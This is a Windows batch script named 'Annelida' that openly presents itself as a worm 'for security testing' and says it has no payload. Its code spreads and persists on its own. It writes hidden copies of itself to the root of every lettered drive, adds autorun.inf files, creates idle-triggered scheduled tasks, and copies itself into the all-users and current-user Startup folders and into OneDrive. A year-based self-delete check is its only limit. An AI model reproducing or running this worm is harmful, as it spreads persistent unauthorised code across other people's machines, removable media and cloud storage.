set currentIteration=0 %= 2023-05-13 =% & goto begin

:begin
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                                                                                                                               ::
::                                                                                                                               ::
::          Created by @Maxwellcrafter as a test of Batch's features. This does not do anything malicious besides exist          ::
::                                                  https://maxwellcrafter.com                                                   ::
::                  Source, documentation, and more can be found at https://github.com/Maxwell-Fisher/Annelida                   ::
::                               a1cbdd7272ff08c2b23eadbd9b92fab96b13e3e6ab8238a47c63075afc9d6870                                ::
::                                                      Version 2023/05/13                                                       ::
::                                                                                                                               ::
::                             This is a worm type script made in Batch purely for security testing,                             ::
::                                    and does not have a payload or any other malicious code.                                   ::
::                                             ! For security testing purposes only !                                            ::
::                                                                                                                               ::
::                                                                                                                               ::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                                                                                                                               ::
::                                                                                                                               ::
::                          The scipt will automatically delete itself after the below year for safety.                          ::
set allowedYear=2025
::                                                                                                                               ::
::                                                                                                                               ::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                                                                                                                               ::
::                                                                                                                               ::
::                     ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::                      ::
::                     ::                                                                                ::                      ::
::                     :: MIT License                                                                    ::                      ::
::                     ::                                                                                ::                      ::
::                     :: Copyright (c) 2022 Maxwell Fisher (@Maxwellcrafter)                            ::                      ::
::                     ::                                                                                ::                      ::
::                     :: Permission is hereby granted, free of charge, to any person obtaining a copy   ::                      ::
::                     :: of this software and associated documentation files (the "Software"), to deal  ::                      ::
::                     :: in the Software without restriction, including without limitation the rights   ::                      ::
::                     :: to use, copy, modify, merge, publish, distribute, sublicense, and/or sell      ::                      ::
::                     :: copies of the Software, and to permit persons to whom the Software is          ::                      ::
::                     :: furnished to do so, subject to the following conditions:                       ::                      ::
::                     ::                                                                                ::                      ::
::                     :: The above copyright notice and this permission notice shall be included in all ::                      ::
::                     :: copies or substantial portions of the Software.                                ::                      ::
::                     ::                                                                                ::                      ::
::                     :: THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR     ::                      ::
::                     :: IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,       ::                      ::
::                     :: FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE    ::                      ::
::                     :: AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER         ::                      ::
::                     :: LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,  ::                      ::
::                     :: OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE  ::                      ::
::                     :: SOFTWARE.                                                                      ::                      ::
::                     ::                                                                                ::                      ::
::                     ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::                      ::
::                                                                                                                               ::
::                                                                                                                               ::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

@echo off
mode 17, 1
cls
setLocal enableDelayedExpansion

:: This stops the script from running and deletes it during any year other than what is allowed
if "%date%" == "!date:%allowedYear%=!" del "%~f0" && exit

set /a currentIteration=currentIteration+1

::Create tasks to run after computer is idle for 15 and 30 minutes
schtasks /create /sc onidle /i 15 /tn "svc1annelida" /tr "%~f0"
schtasks /create /sc onidle /i 30 /tn "svc2annelida" /tr "%~f0"

::Change file name if it's not what it should be, though this code is broken. Honestly forgot why I added it in the first place.
::if not exist "%cd%\annelida.cmd" move "%~f0" annelida.cmd

::Copies to the root directory of all drives which have assigned letters =%
set alphabet=ABCDEFGHIJKLMNOPQRSTUVWXYZ
set alphabetIndex=0
:driveCopyLoop
	if exist "!alphabet:~%alphabetIndex%,1!:" (
		if not exist "!alphabet:~%alphabetIndex%,1!:\annelida.cmd" (
			echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin >"!alphabet:~%alphabetIndex%,1!:\annelida.cmd"& type "%~f0">>"!alphabet:~%alphabetIndex%,1!:\annelida.cmd"& attrib +h "!alphabet:~%alphabetIndex%,1!:\annelida.cmd"
			if not exist "!alphabet:~%alphabetIndex%,1!:\autorun.inf" (
				echo [autorun]>"!alphabet:~%alphabetIndex%,1!:\autorun.inf"& echo open=annelida.cmd>>"!alphabet:~%alphabetIndex%,1!:\autorun.inf"
			)
		)
	)
	set /a alphabetIndex=alphabetIndex+1
if not "%alphabetIndex%" == "25" goto driveCopyLoop

if exist "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" ( %= Copies to the startup folder of all users =%
	if not exist "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"& type "%~f0" >> "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"
	)
)

if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" ( %= Copies to the startup folder of the current user =%
	if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"& type "%~f0" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"
	)
)

if exist "%onedrive%" ( %= Copies to the OneDrive of the current user =%
	if not exist "%onedrive%\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%onedrive%\annelida.cmd"& type "%~f0" >> "%onedrive%\annelida.cmd"& attrib +h "%onedrive%\annelida.cmd"
	)
)

exit
